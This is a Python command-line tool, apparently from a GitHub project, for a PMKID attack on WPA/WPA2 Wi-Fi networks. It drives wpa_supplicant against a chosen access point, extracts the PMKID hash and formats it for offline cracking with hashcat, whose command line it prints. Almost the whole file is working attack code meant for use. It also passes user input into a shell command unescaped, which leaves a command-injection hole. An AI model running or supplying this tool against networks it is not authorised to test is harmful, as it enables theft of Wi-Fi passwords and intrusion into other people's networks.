#!/usr/bin/env python3

import sys
import subprocess
import binascii
import time
import datetime
try:    import argparse
except: print('argparse required, run: pip install argparse');     sys.exit(1)
try:    import pexpect
except: print('pexpect required, run: pip install pexpect');      sys.exit(1)
try:    import netifaces
except: print('netifaces required, run: pip install netifaces');    sys.exit(1)


#----------------------------------------------------------------------------------
def print_usage():
    result  =   "pmkid_crack.py"+"\n"
    result  +=  "2018-08-11, github.com/glezo1"+"\n\n"
    result  +=  "2020-10-05, github.com/eda-abec"+"\n\n"
    result  +=  "[-h] | [--help]       display this help"+"\n"
    result  +=  "[-v] | [--version]    show version"+"\n"
    result  +=  "-i   | --interface    managed-mode interface to be used"+"\n"
    result  +=  "-b   | --bssid        target BSSID"+"\n"
    result  +=  "-e   | --essid        target ESSID"+"\n"
    result  +=  "[-t] | [--timeout]    max seconds to wait for a PMKID.         Defaults to 30"+"\n"
    result  +=  "[-f] | [--file]       tmp file: wpa_supplicant and pmkid hash. Defaults to ./wpa_passphrase.cnf"+"\n"
    result  +=  "[-c] | [--crack]      crack by haschat (or not).               Defaults to 'do-not-crack'"+"\n"
    result  +=  "[-d] | [--dictionary] dictionary file to be used by hashcat"+"\n"
    result  +=  "[-m] | [--mask]       hashcat mask"+"\n"
    result  +=  "[-p] | [--password]   foo password used by wpa_supplicant.     Defaults to 'spameggs'"+"\n"
    result  +=  "\n"
    result  +=  "If -c is specified, hashcat will be called. Otherwise, PMKID hash (if any) will just be displayed"+"\n"
    result  +=  "If -c is specified, pmkid output hash will be stored in -f value, and -d or -m needs to be specified\n"
    result  +=  "\n"
    result  +=  "\n"
    result  +=  "hashcat version cannot easily be infered. Depending on how it was installed, hashcat -V could display"+"\n"
    result  +=  "    2.0"+"\n"
    result  +=  "    v4.2.1-4-g188a956"+"\n"
    result  +=  "    pull/1273/head"+"\n"
    result  +=  "    etc, so be sure your version is >= 4.2.0"+"\n"
    
    print(result)
#-----------------------------------------------------------------------------------
if(__name__=='__main__'):
    current_version =   '0.1.1'
    
    
    unspecified     =   object()
    argument_parser =   argparse.ArgumentParser(usage=None,add_help=False)
    argument_parser.add_argument('-h','--help'      ,action='store_true',default=False                 ,dest='help'      ,required=False  )
    argument_parser.add_argument('-v','--version'   ,action='store_true',default=False                 ,dest='version'   ,required=False  )
    argument_parser.add_argument('-i','--interface' ,action='store'     ,default=None                  ,dest='iface'     ,required=True   )
    argument_parser.add_argument('-b','--bssid'     ,action='store'     ,default=None                  ,dest='bssid'     ,required=True   )
    argument_parser.add_argument('-e','--essid'     ,action='store'     ,default=None                  ,dest='essid'     ,required=True   )
    argument_parser.add_argument('-t','--time'      ,action='store'     ,default=30                    ,dest='max_time'  ,required=False  )
    argument_parser.add_argument('-c','--crack'     ,action='store_true',default=None                  ,dest='crack'     ,required=False  )
    argument_parser.add_argument('-d','--dictionary',action='store'     ,default=None                  ,dest='dictionary',required=False  )
    argument_parser.add_argument('-f','--file'      ,action='store'     ,default='./wpa_passphrase.cnf',dest='file'      ,required=False  )
    argument_parser.add_argument('-m','--mask'      ,action='store'     ,default=None                  ,dest='mask'      ,required=False  )
    argument_parser.add_argument('-p','--password'  ,action='store'     ,default='spameggs'            ,dest='password'  ,required=False  )
    
    
    argument_parser_result      =   argument_parser.parse_args()
    option_help                 =   argument_parser_result.help
    option_version              =   argument_parser_result.version
    iface                       =   argument_parser_result.iface
    bssid                       =   argument_parser_result.bssid
    essid                       =   argument_parser_result.essid
    max_time                    =   argument_parser_result.max_time
    tmp_file                    =   argument_parser_result.file
    wpa_supplicant_password     =   argument_parser_result.password
    crack                       =   argument_parser_result.crack
    password_dictionary_file    =   argument_parser_result.dictionary
    password_mask               =   argument_parser_result.mask

    
    if(option_version):
        print(current_version)
        sys.exit(0)
    elif(option_help):
        print_usage()
        sys.exit(0)
    else:
        if(crack==True and ( (password_dictionary_file==None and password_mask==None) or (password_dictionary_file!=None and password_mask!=None) )  ):
            print_usage()
            print('If -c|--crack is specified, -d|--dictionary XOR -m|--mask must be specified as well')
            sys.exit(1)
    
    
    bssid_hex           =   bssid.replace(':','').replace('-','').upper()
    essid_hex           =   binascii.hexlify(essid.encode('utf-8')).upper()
    available_ifaces    =   netifaces.interfaces()
    if(iface not in available_ifaces):
        print('selected interface "'+iface+'" doesnt exist: '+str(available_ifaces))
        sys.exit(1)
    iface_mac           =   netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'].replace(':','').upper()


    # 1) call wpa_passphrase to generate wpa_supplicant file; with foo password
    parameter_list          =   ['wpa_passphrase',essid,wpa_supplicant_password,'>',tmp_file]
    parameter_list_string   =   ' '.join(parameter_list)
    print(datetime.datetime.strftime(datetime.datetime.now(),'%Y-%m-%d %H:%M:%S')+' calling wpa_passphrase as: '+parameter_list_string)
    try:    subprocess.check_output(parameter_list_string,shell=True)   # shel=True ===> arg must be string, not list
    except: pass

    time_pmkid_start        =   None
    time_pmkid_end          =   None
    time_hashcat_start      =   None
    time_hashcat_end        =   None
    
    # 2) call wpa_supplicant to retrieve the PMKID
    time_pmkid_start        =   time.time()
    parameter_list          =   ['wpa_supplicant','-c',tmp_file,'-i',iface,'-dd']
    parameter_list_string   =   ' '.join(parameter_list)
    cmd_output              =   None
    print(datetime.datetime.strftime(datetime.datetime.now(),'%Y-%m-%d %H:%M:%S')+' calling wpa_supplicant as: '+parameter_list_string)
    
    
    
    pmkid_found             =   False
    whole_hash              =   None
    child                   =   pexpect.spawn(parameter_list_string,timeout=max_time+1)
    try:
        child.expect('.*PMKID from Authenticator.*')
        print(datetime.datetime.strftime(datetime.datetime.now(),'%Y-%m-%d %H:%M:%S')+' pmkid retrieved!')
        child.sendcontrol('c')
        pmkid_found = True
    except pexpect.exceptions.EOF as e:
        # the command ended without matching the pexpect pattern
        pass
    except pexpect.exceptions.TIMEOUT as e:
        # the command timeout (pexpect killed it) without matching the pexpect pattern
        pass
    except Exception as e:
        pass
    if(pmkid_found==True):
        cmd_output  =   child.after
    else:
        cmd_output  =   child.before
    
    
    cmd_output          =   cmd_output.decode('utf-8')
    cmd_output_lines    =   cmd_output.split('\n')
    for current_line in cmd_output_lines:
        current_line = current_line.strip()
        if('RSN: PMKID from Authenticator - hexdump' in current_line):
            hex_pmkid   =   current_line.split(':')[2].replace(' ','').upper()
            whole_hash  =   hex_pmkid+'*'+bssid_hex+'*'+iface_mac+'*'+essid_hex.decode('utf-8')
            print('\t\t\t'+whole_hash)
            break
    time_pmkid_end      =   time.time()
    pmkid_time_elapsed  =   time_pmkid_end - time_pmkid_start
    print(datetime.datetime.strftime(datetime.datetime.now(),'%Y-%m-%d %H:%M:%S')+' pmkid request finished in '+str(pmkid_time_elapsed)+' seconds')
    
    if(pmkid_found==False or crack==None):
        print(datetime.datetime.strftime(datetime.datetime.now(),'%Y-%m-%d %H:%M:%S')+' DONE!')
        sys.exit(0)
    else:
        # copy the pmkid whole hash to the -f file
        with open(tmp_file,'w') as fd_hash_file:
            fd_hash_file.write(whole_hash)
        print('TODO! should call hashcat such as')
        print('hashcat -m 16800 '+tmp_file+' <dictionary_file>|<mask>')
           
        print(datetime.datetime.strftime(datetime.datetime.now(),'%Y-%m-%d %H:%M:%S')+' DONE!')

